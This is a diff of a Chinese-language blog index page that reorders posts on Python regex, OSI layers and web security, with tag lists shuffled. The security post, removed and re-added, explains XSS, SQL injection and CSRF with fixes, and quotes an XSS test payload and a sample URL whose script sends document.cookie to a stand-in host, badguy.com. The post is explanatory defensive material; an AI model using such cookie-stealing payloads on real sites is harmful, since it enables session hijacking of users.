@@ -372,6 +372,117 @@
 
 
   
+    <article id="post-python中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/16/python中正则的使用/">python中正则的使用</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/16/python中正则的使用/" class="archive-article-date">
+  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="python正则的使用"><a href="#python正则的使用" class="headerlink" title="python正则的使用"></a>python正则的使用</h2><ol>
+<li>与js一致,主要看方法</li>
+<li>特殊字符<ol>
+<li><code>.</code>除换行符外的任意字符</li>
+<li><code>^</code>与<code>$</code>起始于结束(<code>^</code>和<code>$</code>放在最前和最后)</li>
+<li>量词<ol>
+<li><code>* + ?</code></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>非捕获型分组<ol>
+<li>正向前瞻<code>\d(?=xxx)</code>, 负向前瞻<code>\d(?!xxx)</code></li>
+<li>正向后顾<code>(?&lt;=xxx)\d</code>, 负向后顾<code>(?&lt;!xxx)\d</code></li>
+</ol>
+</li>
+<li>方法<ol>
+<li><code>re.match(pattern, string)</code>或<code>re.search(pattern, string)</code>返回一个或Null</li>
+<li><code>re.split(&#39;\d&#39;, &#39;1a2b3c&#39;)</code>以正则找到的字符把String切割成数组</li>
+<li><code>re.findall(pattern, string)</code></li>
+</ol>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">正则</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/python//" class="article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/16/python中正则的使用/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-JavaScript中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -595,228 +706,6 @@
 
 
   
-    <article id="post-python中正则的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/16/python中正则的使用/">python中正则的使用</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/06/16/python中正则的使用/" class="archive-article-date">
-  	<time datetime="2018-06-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>与js一致,主要看方法</li>
-<li>特殊字符<ol>
-<li><code>.</code>除换行符外的任意字符</li>
-<li><code>^</code>与<code>$</code>起始于结束(<code>^</code>和<code>$</code>放在最前和最后)</li>
-<li>量词<ol>
-<li><code>* + ?</code></li>
-</ol>
-</li>
-</ol>
-</li>
-<li>非捕获型分组<ol>
-<li>正向前瞻<code>\d(?=xxx)</code>, 负向前瞻<code>\d(?!xxx)</code></li>
-<li>正向后顾<code>(?&lt;=xxx)\d</code>, 负向后顾<code>(?&lt;!xxx)\d</code></li>
-</ol>
-</li>
-<li>方法<ol>
-<li><code>re.match(pattern, string)</code>或<code>re.search(pattern, string)</code>返回一个或Null</li>
-<li><code>re.split(&#39;\d&#39;, &#39;1a2b3c&#39;)</code>以正则找到的字符把String切割成数组</li>
-<li><code>re.findall(pattern, string)</code></li>
-</ol>
-</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">正则</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/python//" class="article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/16/python中正则的使用/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
-  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
-<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
-<li>将用户输入的字符进行HTML Encode转码</li>
-<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
-<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
-<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li>
-</ol>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ol>
-<li>用户输入的字符被解析成SQL脚本运行</li>
-</ol>
-<h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="发生场景-1"><a href="#发生场景-1" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
-<li>受害者访问URL地址,在COOKIE和SEESION失效之前,继续访问这个网站的另一个危险URL地址,服务器则会把受害者的操作当做正常操作,因为COOKIE和SESSION未失效</li>
-</ol>
-<h2 id="测试CSRF漏洞"><a href="#测试CSRF漏洞" class="headerlink" title="测试CSRF漏洞"></a>测试CSRF漏洞</h2><ol>
-<li>抓取一个正常的包,去掉Refererz字段后重新提交,如果有效则可能有CSRF漏洞</li>
-<li>检测工具CSRFTester</li>
-</ol>
-<h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><ol>
-<li>请求必须校验referer字段</li>
-<li>在http请求中以参数的形式产生随机token,并在服务器校验这个token</li>
-<li>在http请求头中添加token值</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-OSI七层模型结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -960,6 +849,117 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/06/12/OSI七层模型结构/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
+  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code>,因此输入的字符被浏览器解析成js代码执行</li>
+<li>恶意URL<code>http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;</code><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2></li>
+<li>将用户输入的字符进行HTML Encode转码</li>
+<li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
+<li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
+<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li>
+</ol>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ol>
+<li>用户输入的字符被解析成SQL脚本运行</li>
+</ol>
+<h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="发生场景-1"><a href="#发生场景-1" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
+<li>受害者访问URL地址,在COOKIE和SEESION失效之前,继续访问这个网站的另一个危险URL地址,服务器则会把受害者的操作当做正常操作,因为COOKIE和SESSION未失效</li>
+</ol>
+<h2 id="测试CSRF漏洞"><a href="#测试CSRF漏洞" class="headerlink" title="测试CSRF漏洞"></a>测试CSRF漏洞</h2><ol>
+<li>抓取一个正常的包,去掉Refererz字段后重新提交,如果有效则可能有CSRF漏洞</li>
+<li>检测工具CSRFTester</li>
+</ol>
+<h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><ol>
+<li>请求必须校验referer字段</li>
+<li>在http请求中以参数的形式产生随机token,并在服务器校验这个token</li>
+<li>在http请求头中添加token值</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
         </p>
       
 
@@ -1481,19 +1481,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">OSI</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">TCP/IP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">自动化测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">selenium</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">OSI</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">TCP/IP</a>
               </li>
              
               <li class="article-tag-list-item">
